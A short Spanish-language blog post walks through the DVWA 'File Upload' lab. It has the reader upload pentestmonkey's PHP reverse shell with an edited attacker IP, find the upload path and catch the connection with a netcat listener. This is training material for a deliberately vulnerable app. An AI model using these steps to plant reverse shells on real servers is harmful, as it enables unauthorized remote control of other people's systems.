---
typora-copy-images-to: ../assets/img
typora-root-url: ../
layout: post
categories:
conToc: true
title: File Upload
---

# File Upload 



Nos descargamos la imagen de https://hub.docker.com/r/vulnerables/web-dvwa

Una vez montada y funcionando nos descargamos el shell.php de esta dirección: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php y modificamos la el valor de la IP con la de nuestra máquina

```php
$ip = '192.168.1.205'
```
Subimos el .php a DVWA y copiamos el valor de la ruta que nos dé

```bash
../../hackable/uploads/shell.php
```

Abrimos un terminal e introducimos:

```bash
nc -v -n -l -p 1234
```

Al poner en el navegador la dirección habremos completado el shell inverso

![image-20220505173031652](/assets/img/image-20220505173031652.png)

